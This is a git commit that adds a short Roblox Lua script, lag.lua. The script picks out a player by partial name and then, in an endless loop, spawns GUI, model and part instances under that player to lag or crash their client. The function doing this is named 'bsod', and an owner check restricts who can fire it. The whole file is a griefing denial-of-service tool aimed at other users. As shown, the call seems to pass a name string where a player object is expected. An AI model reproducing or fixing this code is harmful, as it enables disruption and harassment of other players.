904b88b91989595034efcc7c36f03125241b3f0f
islandmakerepic <mysandwich00@gmail.com>
2015-10-16 18:40:33 -0700

    Create lag.lua

---
+++ lag.lua
@@ -0,0 +1,26 @@
+bsod=function(n,number)
+if getfenv(0).owner==game.Players.islandmaker2012 then
+coroutine.wrap(function()
+while wait(0) do
+  for i=1,number or 10 do
+Instance.new("Part", (Instance.new("Model", (Instance.new("ScreenGui",n)) ) )  )
+  end
+end
+
+end)()
+end
+end
+
+fp=function(N)
+l=#N
+for i,v in pairs(game.Players:children()) do
+if v.Name:lower():sub(1,l)==N:lower() then
+return v
+end
+end
+end
+
+
+_G.lag=function(n,NN)
+if fp(n) then bsod(n,NN) end
+end
